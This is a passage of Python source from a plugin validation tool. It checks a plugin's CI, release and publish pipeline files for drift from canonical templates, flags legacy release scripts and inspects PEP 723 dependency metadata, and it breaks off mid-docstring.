    # WARN-only sibling check_untested_until_release.
    shown = untested[:20]
    more = len(untested) - len(shown)
    listing = ", ".join(shown) + (f", … (+{more} more)" if more else "")
    report.warning(
        f"[RC-TEST-COVERAGE] {len(untested)} of {len(components)} testable "
        f"component(s) have no discoverable test (the plugin ships a suite of "
        f"{len(test_files)} test file(s), so its coverage looks thin): {listing}. "
        "Advisory only — this WARNING does not block the publish."
    )


# Files generated by `generate_plugin_repo.gen_*` that are pure
# infrastructure (publish pipeline, retry helper, pre-push hook, CI / release
# / notify workflows, changelog config, mega-linter config). Plugins are NOT
# expected to customise these — their job is to stay in lockstep with the
# canonical CPV templates so every plugin gets the same security gates,
# idempotent publish pipeline, cross-platform Python, etc.
#
# When any of these drifts from the canonical content, the validator emits a
# WARNING (not blocking a publish, but visible in CI). The plugin-fixer agent
# picks the WARNING up and offers `/cpv-upgrade-plugin` to migrate.
_CANONICAL_PIPELINE_FILES: tuple[tuple[str, str], ...] = (
    ("scripts/publish.py", "gen_publish_py"),
    ("scripts/cpv_network_resilience.py", "gen_cpv_network_resilience_py"),
    ("git-hooks/pre-push", "gen_pre_push_hook"),
    (".github/workflows/ci.yml", "gen_ci_yml"),
    (".github/workflows/release.yml", "gen_release_yml"),
    (".github/workflows/notify-marketplace.yml", "gen_notify_marketplace_yml"),
    ("cliff.toml", "gen_cliff_toml"),
    (".mega-linter.yml", "gen_mega_linter_yml"),
    (".markdownlint.json", "gen_markdownlint_json"),
)


# ── Profile-aware drift (TRDD-e9f13df1, issues #130 / #118-d2) ───────────────
# A plugin whose pipeline profile is NOT `standard` legitimately diverges from
# the standard canon in specific files. For such a file we MUST NOT emit the
# "migrate to the latest standard / run --force-templates" message — that would
# tell the plugin to DOWNGRADE its by-design architecture (re-vendor the CPV
# validators a remote-validation plugin deleted, clobber a submodule-aware
# publish.py, etc.). Instead we recognize the file as an intentional,
# profile-mandated divergence and emit the neutral ahead/accept guidance.
#
# Mapping: profile → the set of `_CANONICAL_PIPELINE_FILES` rel-paths whose
# divergence from the STANDARD template is BY DESIGN for that profile. The
# generator VARIANTS that produce the profile-appropriate expected content are
# Piece C (issues #128/#115) — until those land, Piece A+B recognizes the
# divergence (no downgrade message) rather than byte-comparing against a
# nonexistent variant. The profile selector NEVER suppresses the finding: the
# file still produces a WARNING, just with the profile-aware (neutral)
# recommendation, and every other canon file is still compared against the
# standard template.
#
# remote-validation (#130): publish.py, pre-push (process-ancestry gate),
#   ci.yml all drive the remote gate, not a vendored validator; the vendored
#   helper cpv_network_resilience.py is intentionally ABSENT (so it never even
#   reaches the per-file loop — a missing file is skipped). notify-marketplace,
#   cliff.toml, .markdownlint.json are NOT profile-divergent → still compared
#   against the standard template.
# submodule-build (#128): publish.py is submodule-aware.
# binary-release (#115): release.yml builds+attaches binary assets.
_PROFILE_BY_DESIGN_DRIFT: dict[str, frozenset[str]] = {
    "remote-validation": frozenset(
        {
            "scripts/publish.py",
            "scripts/cpv_network_resilience.py",
            "git-hooks/pre-push",
            ".github/workflows/ci.yml",
        }
    ),
    "submodule-build": frozenset(
        {
            "scripts/publish.py",
        }
    ),
    "binary-release": frozenset(
        {
            ".github/workflows/release.yml",
        }
    ),
}

# Hardening tokens whose drift-direction tells "ahead" from "behind". A token
# appearing on a unified-diff line tells WHO has the hardening:
#   - the diff is unified_diff(expected=CANON, actual=PLUGIN), so a `+` line is
#     present in PLUGIN but NOT canon (plugin is AHEAD on that token), and a `-`
#     line is present in CANON but NOT plugin (plugin is BEHIND on that token).
# This is a real ahead/behind determination (issue #118 defect 2), replacing
# the old keyword-anywhere heuristic that could not distinguish direction.
_HARDENING_MARKERS: tuple[str, ...] = (
    "git push --atomic",
    "SHA-pin",
    "actionlint",
    "commitlint-github-action",
    "wagoid/commitlint",
    "rhysd/actionlint",
    "timeout-minutes",
    "attest-build-provenance",
    "sbom-action",
    "SHA256SUMS",
    "persist-credentials: false",
    "permissions:",
    "MARKETPLACE_PAT",
    # A SHA-pinned `uses:` reference (40-hex after @) is itself a hardening
    # signal; matched structurally by _line_has_sha_pin below, not as a literal.
)

# A `uses: owner/action@<40-hex-sha>` reference — the structural form of "this
# action is SHA-pinned". Used to detect a pin appearing only on the plugin (+)
# or only on canon (-) side of the diff.
_SHA_PINNED_USES_RE = re.compile(r"uses:\s*\S+@[0-9a-f]{40}\b")


def _classify_drift_direction(diff_lines: list[str]) -> str:
    """Classify a standard-canon file's drift direction (issue #118 defect 2).

    Given the unified-diff lines (canon → plugin, i.e.
    ``unified_diff(expected=CANON, actual=PLUGIN)``), determine whether the
    PLUGIN is ahead of canon (carries hardening canon lacks), behind canon
    (canon carries hardening the plugin lacks), or neither/both.

    Returns one of four states. The first three are a real ahead/behind
    determination from the diff direction; the fourth preserves today's exact
    behavior for a plain stale file so a STANDARD plugin's migrate guidance is
    unchanged (FN-safety: no regression for the common case):

      * ``"ahead"``   — plugin adds hardening (a marker on a ``+`` line) and
                        canon removes none (no marker on any ``-`` line).
                        Recommend upstream/accept; NEVER recommend downgrading.
      * ``"behind"``  — canon carries hardening the plugin lacks (a marker on a
                        ``-`` line) and the plugin adds none. Recommend upgrade.
      * ``"mixed"``   — BOTH sides carry hardening markers. Ambiguous; default to
                        the SAFE (ahead/neutral) message — never tell a plugin to
                        downgrade when hardening is present on both sides
                        (the issue #22 case).
      * ``"plain"``   — NEITHER side carries any hardening marker. This is the
                        ordinary "file just drifted / is stale" case; today's
                        behavior is the migrate recommendation, and we preserve
                        it exactly so a behind-canon standard file is still told
                        to upgrade.

    Only added (``+``)/removed (``-``) lines are inspected; diff headers
    (``+++`` / ``---``) and ``@@`` hunks are skipped.
    """
    plugin_has_extra_hardening = False  # a hardening marker on a `+` line
    canon_has_extra_hardening = False  # a hardening marker on a `-` line
    for line in diff_lines:
        if line.startswith("+++") or line.startswith("---") or line.startswith("@@"):
            continue
        if line.startswith("+"):
            body = line[1:]
            if any(marker in body for marker in _HARDENING_MARKERS) or _SHA_PINNED_USES_RE.search(body):
                plugin_has_extra_hardening = True
        elif line.startswith("-"):
            body = line[1:]
            if any(marker in body for marker in _HARDENING_MARKERS) or _SHA_PINNED_USES_RE.search(body):
                canon_has_extra_hardening = True
    if plugin_has_extra_hardening and not canon_has_extra_hardening:
        return "ahead"
    if canon_has_extra_hardening and not plugin_has_extra_hardening:
        return "behind"
    if plugin_has_extra_hardening and canon_has_extra_hardening:
        return "mixed"
    return "plain"


def validate_canonical_pipeline_drift(plugin_root: Path, report: ValidationReport) -> None:
    """Emit a WARNING for every canonical pipeline file that drifts from the
    latest CPV template.

    Each file in ``_CANONICAL_PIPELINE_FILES`` is generated from a deterministic
    `gen_*(p: PluginParams)` function in `generate_plugin_repo`. We re-run the
    generator with the plugin's own manifest params and byte-compare the
    rendered string against the file on disk.

    Plugins that opted into a specific older standard, or that intentionally
    customised one of these files, will see the WARNING — and that is desired
    behaviour: the WARNING tells them `/cpv-upgrade-plugin` will sync them to
    the latest standard (idempotent publish.py, sanitized inputs, pathlib-only
    Python, no bash hook constructs, validate_pipeline_script_refs, etc.).

    Skipped when scanning CPV itself — the canonical templates ARE CPV's own
    files, so any change CPV makes to the templates would self-warn.

    Skipped silently when:
      - The file is missing (validate_pipeline_readiness already flags missing
        publish.py / cliff.toml / workflows; emitting a drift warning on top
        would be noise).
      - `generate_plugin_repo` cannot be imported (e.g. the plugin under test
        is on an old CPV checkout that lacks one of the gen_* helpers).
      - The plugin's manifest cannot be read (other validators already warn).
    """
    # CPV self-scan: skip — the templates ARE CPV's own files.
    try:
        from validate_security import is_cpv_self_scan

        if is_cpv_self_scan(plugin_root):
            return
    except ImportError:
        # Best-effort import; if validate_security is unavailable, fall through
        # to the manifest-name heuristic below.
        plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
        if plugin_json.is_file():
            try:
                manifest_data = json.loads(plugin_json.read_text(encoding="utf-8"))
                if isinstance(manifest_data, dict) and manifest_data.get("name") == "claude-plugins-validation":
                    return
            except (OSError, json.JSONDecodeError):
                pass

    # Read the plugin's manifest so we can populate template params.
    plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
    if not plugin_json.is_file():
        return  # validate_required_files already flags this
    try:
        manifest_data = json.loads(plugin_json.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return

    # Import the generator and the params helper.
    scripts_dir = Path(__file__).resolve().parent
    if str(scripts_dir) not in sys.path:
        sys.path.insert(0, str(scripts_dir))
    try:
        import generate_plugin_repo as gen_module
        from standardize_plugin import _params_from_manifest
    except ImportError:
        return

    try:
        params = _params_from_manifest(manifest_data)
    except Exception:  # noqa: BLE001 — _params_from_manifest is an external helper; any failure here just disables the optional drift check, never the run
        return

    # SECURITY (TRDD-02e1672b): the `cpv.allow_pipeline_drift` suppression key
    # has been REMOVED — a plugin must not be able to silence CPV's
    # pipeline-drift findings from its own config (a malicious author could
    # list every drifted file and self-approve). Drift is ALWAYS reported
    # (WARNING, non-blocking); intentional drift is the maintainer's call to
    # live with the advisory, not to suppress it.

    # Resolve the plugin's pipeline PROFILE (TRDD-e9f13df1, issues #130 / #118-d2).
    # The profile is a SELECTOR, never a SUPPRESSOR: it decides WHICH canon a
    # file's divergence is judged against (and therefore which RECOMMENDATION
    # text the WARNING carries), but it never silences a finding. A non-standard
    # profile recognizes specific files as intentional, profile-mandated
    # divergences (no "migrate/downgrade" message); every other canon file is
    # still compared against the standard template exactly as before. Resolution
    # fails SAFE to `standard` on any error — current behavior, no suppression.
    try:
        from cpv_pipeline_profile import resolve_pipeline_profile

        profile = resolve_pipeline_profile(plugin_root)
    except Exception:  # noqa: BLE001 — profile resolution is advisory; any failure falls back to `standard` (unchanged behavior, no suppression)
        profile = "standard"
    by_design_files = _PROFILE_BY_DESIGN_DRIFT.get(profile, frozenset())

    # INTENTIONAL-DIVERGENCE manifest declaration (issue #144Ba). A maintainer
    # may list specific shared-canon files they have deliberately customized
    # under `cpv.pipeline.intentional_divergence`. For such a file the drift
    # detector still EMITS an auditable informational note (the divergence is
    # never invisible), but DROPS the "/cpv-upgrade-plugin / --force-templates"
    # recommendation — force-templating a deliberately-customized file would
    # REGRESS it (the #144/#145 incident). This is a NUDGE selector, NOT a
    # finding suppressor: the note is still produced, and it has no effect on
    # any other validation or on the security scanner. Resolution fails SAFE to
    # the empty set (no behavior change) on any error.
    try:
        from cpv_pipeline_profile import resolve_intentional_divergence

        intentional_divergence = resolve_intentional_divergence(plugin_root)
    except Exception:  # noqa: BLE001 — advisory; any failure means no file is marked divergent (the unchanged default), never a suppression
        intentional_divergence = frozenset()

    # binary-release STRUCTURAL recognition (#115 / Piece C2a). For a
    # binary-release plugin, the release workflow is toolchain-specific and can
    # NEVER byte-match the standard `gen_release_yml`, so the standard byte-
    # compare would forever emit the false "missing standard release.yml" drift
    # flag. Instead we judge it STRUCTURALLY: a CANONICAL binary-release release
    # workflow (SHA-pinned third-party actions + least-privilege split + a
    # checksum step + a build matrix) clears the release.yml drift WARNING; a
    # DEFICIENT one (missing any of the four) still WARNs, naming the missing
    # requirement(s). This is a SELECTOR, never a SUPPRESSOR (TRDD-02e1672b):
    # declaring binary-release HOLDS the plugin to the binary-release canon — a
    # deficient workflow is never silenced. Resolution fails SAFE (treated as
    # NON-canonical → keeps the by-design WARNING) on any error.
    br_release_canonical = False
    br_missing_requirements: list[str] = []
    br_release_workflow: Path | None = None
    if profile == "binary-release":
        try:
            from cpv_pipeline_profile import (
                binary_release_canonical_status,
                binary_release_release_workflow,
            )

            br_release_workflow = binary_release_release_workflow(plugin_root)
            br_release_canonical, br_missing_requirements = binary_release_canonical_status(plugin_root)
        except Exception:  # noqa: BLE001 — recognition is advisory; any failure leaves the by-design WARNING in place (conservative), never suppresses
            br_release_canonical = False
            br_missing_requirements = []
            br_release_workflow = None

    # Per-file emission with embedded unified diff.
    #
    # Issue #21 ask #3: instead of one consolidated warning naming six files,
    # emit one warning per drifted file containing the unified diff hunks
    # (with @@ line markers) so the reader can immediately see WHICH lines
    # drifted, not just WHICH files. Severity stays WARNING — escalation to
    # MAJOR is the job of validate_workflow_path_refs (issue #21 ask #2),
    # which targets a NARROWER subset (broken paths/globs in workflow run:
    # bodies), not whole-file template drift.
    for rel_path, gen_func_name in _CANONICAL_PIPELINE_FILES:
        target = plugin_root / rel_path
        if not target.is_file():
            continue
        try:
            actual_content = target.read_text(encoding="utf-8", errors="replace")
        except OSError:
            continue
        gen_func = getattr(gen_module, gen_func_name, None)
        if gen_func is None:
            continue
        try:
            # Some gen_* are unparameterized; introspect the signature instead
            # of guessing. A gen_* that ALSO declares a `profile` parameter
            # (currently `gen_publish_py`, TRDD-e9f13df1 / #128) is compared
            # against the PROFILE-APPROPRIATE variant: a `submodule-build`
            # plugin's publish.py is byte-compared against the submodule-aware
            # variant, so a correct one CLEARS (no WARNING) while a
            # submodule-build plugin still carrying the STALE standard publish.py
            # still differs (and the by-design branch below emits the neutral,
            # no-downgrade WARNING). The profile is a SELECTOR (which canon to
            # compare against), never a suppressor — a non-matching file always
            # still WARNs.
            import inspect

            sig = inspect.signature(gen_func)
            if not sig.parameters:
                expected_content = gen_func()
            elif "profile" in sig.parameters:
                expected_content = gen_func(params, profile)
            else:
                expected_content = gen_func(params)
        except Exception:  # noqa: BLE001 — gen_func is an arbitrary template generator; a failure in one just skips that file's drift check
            continue
        if actual_content == expected_content:
            continue

        # binary-release release.yml STRUCTURAL recognition (#115 / Piece C2a).
        # A binary-release plugin's release workflow is toolchain-specific and
        # can NEVER byte-match `gen_release_yml`, so the standard byte-compare
        # above will always report it as drifted. Judge it STRUCTURALLY instead:
        #   * CANONICAL (all four invariants met) → it is recognized as the
        #     binary-release canon, NOT a "missing standard release.yml" gap —
        #     emit NO drift WARNING for this file (clear the false flag).
        #   * DEFICIENT (missing ≥1 invariant) → STILL WARN, naming the missing
        #     requirement(s). This is the SELECTOR behavior (TRDD-02e1672b):
        #     declaring binary-release HOLDS the plugin to the binary-release
        #     canon — a deficient workflow is never silenced.
        # We only short-circuit when this very release.yml IS the plugin's
        # binary-release workflow (it satisfies the matrix+upload+SHA256SUMS
        # co-occurrence). If the binary build lives in a differently-named
        # workflow (e.g. memgrep-release.yml) and this release.yml is something
        # else, fall through to the normal by-design / drift handling below.
        if (
            profile == "binary-release"
            and rel_path == ".github/workflows/release.yml"
            and br_release_workflow is not None
            and br_release_workflow == target
        ):
            if br_release_canonical:
                # Canonical binary-release workflow — recognized, not drift.
                continue
            report.warning(
                f"[RC-PIPELINE-DRIFT-001] {rel_path} is this plugin's "
                f"`binary-release` workflow but is NOT yet a CANONICAL "
                f"binary-release release workflow — it is missing: "
                f"{', '.join(br_missing_requirements)}. A binary-release "
                f"workflow is toolchain-specific and cannot byte-match the "
                f"standard `release.yml` template, so CPV judges it "
                f"STRUCTURALLY: it must SHA-pin every third-party action, split "
                f"least-privilege permissions (build job `contents: read`, "
                f"exactly one job `contents: write`), produce a `SHA256SUMS` "
                f"(or per-asset `.sha256`) checksum, and build a `matrix` over "
                f"targets (the janitor `memgrep-release.yml` shape). Add the "
                f"missing requirement(s) above. This WARNING is advisory and "
                f"non-blocking; the `binary-release` profile is a SELECTOR, not "
                f"a suppressor (TRDD-02e1672b) — it cannot silence a finding, "
                f"and a deficient workflow is held to the canon.",
                file=rel_path,
            )
            continue

        # Build a unified diff. Cap at ±10 hunks per file or 200 diff lines
        # total per emission so the message stays readable. The diff is
        # produced with `lineterm=""` per Python docs — every yielded hunk
        # line already contains its own newline, so no double-newlines and
        # no trailing-LF noise.
        diff_iter = difflib.unified_diff(
            expected_content.splitlines(),
            actual_content.splitlines(),
            fromfile=f"canonical/{rel_path}",
            tofile=f"plugin/{rel_path}",
            lineterm="",
            n=3,
        )
        diff_lines: list[str] = []
        hunk_count = 0
        max_hunks = 10
        max_diff_lines = 200
        truncated = False
        for hunk_line in diff_iter:
            if hunk_line.startswith("@@"):
                hunk_count += 1
                if hunk_count > max_hunks:
                    truncated = True
                    break
            if len(diff_lines) >= max_diff_lines:
                truncated = True
                break
            diff_lines.append(hunk_line)

        diff_body = "\n".join(diff_lines)
        if truncated:
            diff_body += (
                f"\n... (diff truncated at {max_hunks} hunks / "
                f"{max_diff_lines} lines — full diff: "
                f"`diff -u <canonical> {rel_path}`)"
            )

        # INTENTIONAL DIVERGENCE (issue #144Ba) — checked BEFORE the
        # recommendation branches. The maintainer declared THIS file in
        # `cpv.pipeline.intentional_divergence`: it is deliberately customized
        # away from canon, and force-templating it would REGRESS that
        # customization (the #144/#145 incident). So we drop the upgrade NUDGE
        # for this file and emit an auditable INFORMATIONAL note instead — the
        # divergence stays VISIBLE (never silently suppressed) and is
        # non-blocking. This does not touch the ahead-of-canon "would DOWNGRADE"
        # guidance for UNMARKED files, nor any other validation; it is a nudge
        # selector, not a finding suppressor (the note is still produced).
        if rel_path in intentional_divergence:
            report.info(
                f"[RC-PIPELINE-DRIFT-001] {rel_path} differs from the canonical "
                f"CPV standard, but the plugin DECLARES it as an intentional "
                f"divergence (`cpv.pipeline.intentional_divergence`) — not "
                f"recommending an upgrade. This file is deliberately customized; "
                f"force-templating it (via `/cpv-upgrade-plugin` or "
                f"`--force-templates`) would REGRESS that customization, so the "
                f"upgrade nudge is intentionally withheld. The divergence is "
                f"recorded here for audit; review the diff if the customization "
                f"is no longer wanted (then remove the declaration to re-enable "
                f"the upgrade nudge).\n"
                f"Unified diff (canonical → plugin):\n{diff_body}",
                file=rel_path,
            )
            continue

        # Pick the recommendation text. THREE cases, in priority order
        # (TRDD-e9f13df1, issues #130 / #118-d2). NONE of these suppress the
        # WARNING — every drifted file still emits one; only the guidance
        # differs, and never tells a plugin to DOWNGRADE.
        #
        # 1. PROFILE BY-DESIGN (#130 / #128 / #115) — the file's divergence is
        #    mandated by the plugin's non-standard pipeline profile (e.g. a
        #    remote-validation plugin's publish.py drives the remote gate, not a
        #    vendored validator; its pre-push is the process-ancestry gate). We
        #    recognize this as intentional and tell the maintainer to keep it /
        #    upstream it — NEVER to run `--force-templates` (which would
        #    re-vendor the validators the plugin deliberately removed, or
        #    clobber its submodule-aware publish.py).
        # 2. AHEAD / mixed (#118-d2) — for a standard-canon file, a real
        #    ahead/behind determination from the diff direction. AHEAD (plugin
        #    carries hardening canon lacks) or MIXED (hardening on BOTH sides,
        #    ambiguous) → upstream or accept; default to this SAFE message so an
        #    ahead-of-canon plugin is never told to downgrade.
        # 3. BEHIND / plain (#118-d2) — canon carries hardening the plugin lacks
        #    (BEHIND), OR the file is simply stale with no hardening signal on
        #    either side (PLAIN — today's ordinary case) → migrate. This is the
        #    only branch that recommends `--force-templates`. The PLAIN path
        #    preserves today's EXACT behavior for a standard plugin so a
        #    behind-canon file is still told to upgrade (FN-safety: no
        #    regression for the common case).
        direction = _classify_drift_direction(diff_lines)
        if rel_path in by_design_files:
            recommendation = (
                f"This file's divergence is BY DESIGN for the plugin's "
                f"`{profile}` pipeline profile. CPV recognizes the "
                f"profile-mandated shape (e.g. a remote-validation plugin's "
                f"publish.py/CI drive the remote `cpv-remote-validate --strict` "
                f"gate instead of a vendored validator, and its pre-push is the "
                f"process-ancestry gate — a stronger alternative to the env-var "
                f"gate; a submodule-build plugin's publish.py is submodule-aware; "
                f"a binary-release plugin's release.yml builds and attaches "
                f"binary assets). Do NOT run `--force-templates` for this file — "
                f"it would downgrade your by-design architecture (e.g. re-vendor "
                f"the CPV validators you deliberately removed). Keep this file, "
                f"or upstream any further hardening. This WARNING is advisory and "
                f"non-blocking; the `{profile}` profile is a SELECTOR (which canon "
                f"to compare against), not a suppressor — it cannot silence a "
                f"finding (TRDD-02e1672b). The genuinely-shared canon (SHA-pinned "
                f"actions, least-privilege permissions, the notify chain, version "
                f"consistency, atomic push) is still fully enforced."
            )
        elif direction in ("ahead", "mixed"):
            # AHEAD-or-ambiguous: the plugin is at or above canon on this file
            # (issue #22 / #118-d2) — hardening on the plugin side (AHEAD) or on
            # BOTH sides (MIXED). NEVER suggest regressing it. The phrases below
            # are still backed by real template facts (the canon templates DO
            # SHA-pin actions, atomic-push, etc.), so the #118-d1 over-promise
            # guard stays satisfied.
            recommendation = (
                "This file appears to be at or AHEAD of canon (it carries "
                "hardening — SHA-pinned actions, atomic push, "
                "actionlint/commitlint gates, per-job timeout-minutes, "
                "SBOM/provenance, or a MARKETPLACE_PAT preflight — that the "
                "canonical template does not, or the direction is ambiguous). "
                "Do NOT run `--force-templates`: it would DOWNGRADE this file. "
                "Review the unified diff; if your version is strictly above "
                "canon, consider opening an upstream PR to fold your hardening "
                "into the canonical template so the gap clears at the source. "
                "This WARNING is advisory and non-blocking; it cannot be "
                "suppressed via plugin config (TRDD-02e1672b)."
            )
        else:
            # BEHIND or PLAIN (#118-d2): canon carries hardening this file lacks
            # (BEHIND), or the file is simply stale with no hardening signal
            # either way (PLAIN — the ordinary case, unchanged from today).
            # NOTE: the parenthetical below describes what canon bundles
            # ACROSS the pipeline as a whole — it must stay truthful to the
            # generated templates (gen_ci_yml / gen_release_yml /
            # gen_notify_marketplace_yml). ci.yml carries the actionlint +
            # commitlint gates and the macOS test matrix; release.yml carries
            # the SBOM + build-provenance attestation + per-asset SHA256SUMS;
            # ALL three workflows are SHA-pinned, carry per-job
            # timeout-minutes, and env-sanitize the github.* expressions their
            # run blocks consume. Do not list a feature here that the
            # templates do not actually emit (issue #118 defect 1).
            recommendation = (
                "Run `/cpv-upgrade-plugin` (or `uvx cpv-remote-validate "
                "standardize <plugin> --fix --force-templates`) to migrate "
                "to the latest standard. Canon now bundles: idempotent "
                "publish.py with atomic push; SHA-pinned actions, per-job "
                "timeout-minutes, and env-sanitized run blocks across ci.yml, "
                "release.yml, and notify-marketplace.yml; actionlint + "
                "commitlint gates and a macOS test matrix in ci.yml; and an "
                "SBOM, a build-provenance attestation, and per-asset "
                "SHA256SUMS in release.yml. CAUTION: if you have deliberately "
                "customized this shared-canon file, `--force-templates` will "
                "OVERWRITE (and therefore REGRESS) your changes — to keep an "
                "intentional customization and silence this nudge, declare the "
                "file in `cpv.pipeline.intentional_divergence` in your "
                "plugin.json (the upgrade flow then skips force-overwriting it)."
            )
        report.warning(
            f"[RC-PIPELINE-DRIFT-001] Plugin pipeline differs from the "
            f"canonical CPV standard in {rel_path}. {recommendation}\n"
            f"Unified diff (canonical → plugin):\n{diff_body}",
            file=rel_path,
        )


# Legacy pipeline scripts that older `generate_plugin_repo` versions emitted
# but that publish.py now subsumes. Plugins upgraded to the canonical pipeline
# should NOT keep these around — invoking them bypasses the 14 publish gates
# (security scans, gh-auth precheck, integrity manifest, idempotency, etc.).
#
# Each entry: (relative-path, replaced-by, why-it's-legacy).
# Severity emitted by `validate_legacy_pipeline_scripts`: MINOR — informational,
# does not block publish; the fixer agent moves these to scripts_dev/ on the
# `/cpv-upgrade-plugin` path.
_LEGACY_PIPELINE_SCRIPTS: tuple[tuple[str, str, str], ...] = (
    (
        "scripts/bump_version.py",
        "scripts/publish.py --patch / --minor / --major",
        "publish.py owns version bumping — Gate 7 reads the remote tag and calls bump_semver() idempotently",
    ),
    (
        "scripts/release.sh",
        "scripts/publish.py",
        "publish.py is the canonical 14-gate release pipeline; .sh blocks Windows users",
    ),
    (
        "scripts/release.py",
        "scripts/publish.py",
        "publish.py is the canonical 14-gate release pipeline",
    ),
    (
        "scripts/publish.sh",
        "scripts/publish.py",
        "publish.py replaces publish.sh; .sh blocks Windows users",
    ),
    (
        "scripts/lint.sh",
        ".github/workflows/ci.yml + publish.py Gate 4 (lint)",
        "linting runs in CI on every push and inside publish.py Gate 4 — lint.sh is a pre-CPV-pipeline artefact",
    ),
    (
        "scripts/setup-hooks.sh",
        "scripts/setup-hooks.py",
        "setup-hooks.py is cross-platform Python; .sh blocks Windows users",
    ),
    (
        "scripts/compute_hashes.py",
        "scripts/publish.py Gate 8 (integrity manifest)",
        "publish.py Gate 8 generates and signs the integrity manifest; "
        "third-party plugins should NOT ship a hash computer",
    ),
    (
        "scripts/verify_hashes.py",
        "scripts/publish.py Gate 8 verification",
        "publish.py verifies hashes during the release; downstream verifiers live in CPV's _plugin_verify_hashes.py",
    ),
    (
        "scripts/changelog.py",
        "scripts/publish.py Gate 9 (git-cliff)",
        "publish.py Gate 9 invokes git-cliff with the cliff.toml emitted by the canonical pipeline",
    ),
    (
        "scripts/generate_changelog.py",
        "scripts/publish.py Gate 9",
        "publish.py Gate 9 generates CHANGELOG.md",
    ),
    (
        "scripts/check_version.py",
        "scripts/publish.py Gate 7",
        "publish.py Gate 7 validates version consistency across plugin.json, marketplace.json, pyproject.toml, etc.",
    ),
    (
        "scripts/install.sh",
        "Documentation in README + claude plugin install",
        "users install via `claude plugin install` — install.sh is a pre-pipeline artefact",
    ),
)


def validate_legacy_pipeline_scripts(plugin_root: Path, report: ValidationReport) -> None:
    """Emit a MINOR finding for every known-legacy pipeline script that
    survives in the plugin's `scripts/` folder.

    Older versions of `generate_plugin_repo.py` shipped helpers
    (bump_version.py, release.sh, lint.sh, etc.) that have since been
    subsumed by publish.py's 14-gate pipeline. Plugins migrated via
    `/cpv-upgrade-plugin` MUST have these removed — leaving them around
    invites users to invoke the legacy entry-point and skip the canonical
    gates (security scans, gh-auth precheck, integrity manifest,
    idempotent commit/tag/push, etc.).

    Severity is MINOR (not MAJOR) so the finding is informational and
    does not block publishing — the fixer's `--upgrade` flow moves the
    files to `scripts_dev/` (preservation guardrail) instead of deleting
    them, then the user can decide whether to delete after verifying.

    Skipped on CPV self-scan (CPV is the canonical source — the listed
    files don't exist at CPV root anyway, but the early-return keeps the
    rule cheap on every CPV-self lint pass).
    """
    # Skip CPV self-scan.
    try:
        from validate_security import is_cpv_self_scan

        if is_cpv_self_scan(plugin_root):
            return
    except ImportError:
        plugin_json = plugin_root / ".claude-plugin" / "plugin.json"
        if plugin_json.is_file():
            try:
                manifest_data = json.loads(plugin_json.read_text(encoding="utf-8"))
                if isinstance(manifest_data, dict) and manifest_data.get("name") == "claude-plugins-validation":
                    return
            except (OSError, json.JSONDecodeError):
                pass

    for rel_path, replaced_by, reason in _LEGACY_PIPELINE_SCRIPTS:
        target = plugin_root / rel_path
        if not target.is_file():
            continue
        report.minor(
            f"[RC-LEGACY-PIPELINE-001] Legacy pipeline script `{rel_path}` is "
            f"obsoleted by `{replaced_by}` — {reason}. The fixer can move it "
            f"to scripts_dev/ via `/cpv-upgrade-plugin` (preservation guardrail: "
            f"the legacy file is moved, not deleted, so the user can review "
            f"before final removal).",
            rel_path,
        )


_PEP723_BLOCK_RE = re.compile(
    r"^# /// script\s*\n(?P<body>(?:^#.*\n)*?)^# ///\s*$",
    re.MULTILINE,
)
_PEP723_DEPS_RE = re.compile(
    r"^#\s*dependencies\s*=\s*\[(?P<deps>.*?)\]",
    re.MULTILINE | re.DOTALL,
)
_PYTHON_STDLIB_PREFIXES: tuple[str, ...] = (
    # Conservative subset — anything else is treated as needing a venv.
    "argparse",
    "ast",
    "asyncio",
    "base64",
    "bisect",
    "collections",
    "concurrent",
    "contextlib",
    "copy",
    "csv",
    "dataclasses",
    "datetime",
    "difflib",
    "enum",
    "errno",
    "fnmatch",
    "functools",
    "glob",
    "gzip",
    "hashlib",
    "heapq",
    "hmac",
    "html",
    "http",
    "importlib",
    "inspect",
    "io",
    "ipaddress",
    "itertools",
    "json",
    "logging",
    "math",
    "mimetypes",
    "multiprocessing",
    "operator",
    "os",
    "pathlib",
    "pickle",
    "platform",
    "pprint",
    "queue",
    "random",
    "re",
    "secrets",
    "select",
    "shlex",
    "shutil",
    "signal",
    "socket",
    "sqlite3",
    "ssl",
    "stat",
    "string",
    "struct",
    "subprocess",
    "sys",
    "tempfile",
    "textwrap",
    "threading",
    "time",
    "tomllib",
    "traceback",
    "types",
    "typing",
    "unicodedata",
    "unittest",
    "urllib",
    "uuid",
    "venv",
    "warnings",
    "weakref",
    "xml",
    "zipfile",
    "zlib",
)


def _pep723_has_runtime_deps(body: str) -> bool:
    """True when a PEP 723 metadata block declares ≥ 1 non-stdlib dependency.

    Body is the inline-comment block between `# /// script` and `# ///`. We
    parse the `dependencies = [ ... ]` list and check each entry's leading
    package-name token against the conservative stdlib prefix list. An empty
    list (`dependencies = []`) is fine — no `uv run` needed because the
    script imports nothing extra.
    """
    deps_match = _PEP723_DEPS_RE.search(body)
    if not deps_match:
        return False
    deps_str = deps_match.group("deps")
    # Strip per-line comment leaders and quotes; collect package-name tokens.
    cleaned = re.sub(r"^\s*#\s?", "", deps_str, flags=re.MULTILINE)
    for raw in cleaned.split(","):
        token = raw.strip().strip("\"'")
        if not token:
            continue
        # Slice off version/extra markers (e.g. "ruamel.yaml>=0.18", "pkg[opt]>=1").
        pkg = re.split(r"[<>=!~\[;]", token, maxsplit=1)[0].strip()
        if not pkg:
            continue
        # Top-level module name (e.g. "ruamel.yaml" → "ruamel" — close enough).
        head = pkg.split(".")[0].lower().replace("-", "_")
        if head not in _PYTHON_STDLIB_PREFIXES:
            return True
    return False


def validate_pep723_invocations(plugin_root: Path, report: ValidationReport) -> None:
    """Emit MAJOR for `python <script.py>` invocations of PEP 723 scripts.

    Background (reported 2026-05-09): plugin-creator scaffolded scripts that
    declare runtime dependencies via a PEP 723 inline-script metadata block
    (``# /// script ... # ///``), but the generated invocations in commands /
    agents / skills / hooks / README used bare ``python <script>`` /
    ``python3 <script>`` instead of ``uv run <script>``. Bare ``python`` ignores
    the inline metadata block, so the script ImportErrors on the first
    non-stdlib import the moment a user runs it. The plugin "looks valid" to
    every static check yet is broken at runtime for anyone whose Python env
    lacks the listed deps.

    Detection:
      1. Walk ``scripts/*.py`` for the regex
         ``^# /// script\\s*\\n(?:^#.*\\n)*?^# ///\\s*$``.
      2. For each script with a non-empty ``dependencies`` list (i.e. NOT
